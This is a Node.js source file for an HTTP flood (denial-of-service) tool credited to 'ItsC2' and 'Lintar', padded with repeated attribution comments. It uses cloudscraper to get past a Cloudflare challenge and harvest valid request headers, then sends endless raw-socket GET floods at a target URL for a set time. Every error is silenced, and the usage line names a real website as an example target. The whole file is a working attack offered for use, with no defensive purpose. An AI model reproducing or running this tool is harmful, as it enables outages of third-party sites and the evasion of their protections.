// CR : Lintar21 , ItsC2 Ga Make Cr? : BL+LUNIGGER
require('events').EventEmitter.defaultMaxListeners = 0;
const CloudScraper = require('cloudscraper'),
    path = require('path'),
    url = require('url');                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR
                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR
if (process.argv.length !== 5) {
    console.log(`
Usage : node ${path.basename(__filename)} <url> <time> <req_per_ip>
Contoh: node ${path.basename(__filename)} https://pornhub.com 60 150`);                                                                                                                                                                                     //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR                                                                                                                                                                                    //BY ITSC2 BY LINTAR
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4],
    host = url.parse(target).host;

let getHeaders = function () {
    return new Promise(function (resolve, reject) {
        CloudScraper.get({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 1
        }, function (error, response) {                                                                                                                                                                                    //BY ITSC2 BY LINTAR
            if (error) {
                //If cloudscraper return an error will retry
                console.log(`ERROR: ${error.message}, retrying the request.`);
                return start();
            }
            let headers = '';
            Object.keys(response.request.headers).forEach(function (i, e) {
                //The following headers might break the request
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });

            console.log(headers);
            resolve(headers);
        });
    });
}
                                                                                                                                                                                    //BY ITSC2 BY LINTAR
function send_req(headers) {
    const net = require('net'),
        client = new net.Socket();

    client.connect(80, host);
    client.setTimeout(10000);

    for (let i = 0; i < req_per_ip; ++i) {
        client.write(                                                                                                                                                                                    //BY ITSC2 BY LINTAR
            `GET ${target} HTTP/1.1\r\n` +
            headers + '\r\n\r\n'
        )
    }

    client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    });
}

let init = function () {
    getHeaders().then(function (result) {
        console.log('Attack Sent ! By ItsC2');
        setInterval(() => {
            send_req(result);
        });
    });
};

setTimeout(() => {
    console.log('Attack End ! By ItsC2');
    process.exit(0)
}, time * 1000);

init();

// to avoid errors
process.on('uncaughtException', function (err) {                                                                                                                                                                                      //BY ITSC2 BY LINTAR 
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err); //By ItsC2
});